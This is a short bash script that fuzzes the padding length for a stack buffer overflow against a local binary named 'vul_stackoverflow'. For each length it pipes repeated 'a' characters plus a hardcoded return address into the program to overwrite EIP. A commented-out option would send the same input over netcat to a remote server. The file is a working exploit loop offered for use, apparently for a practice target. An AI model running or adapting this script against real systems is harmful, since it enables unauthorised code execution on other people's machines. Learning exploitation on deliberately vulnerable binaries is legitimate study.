#!/bin/bash


## A super lazy script to perform stack buffer overflow and overwrite EIP

target_program='./vul_stackoverflow'
target_address='\xd4\x85\x04\x08'
#targe_server='nc example.com 8888' ## Uncomment this section if the target program is hosted on remote server.

# You may need to change the size of loop depending on the size of the buffer.
for i in {1..100};
	do
		echo $i
		garbage_data=$(yes 'a' | head -n $i | tr -d '\n')
		echo "Sending exploit: $garbage_data$target_address"
		echo -e $garbage_data$target_address | $target_program
		#echo -e $garbage_data$target_address | $target_server
	done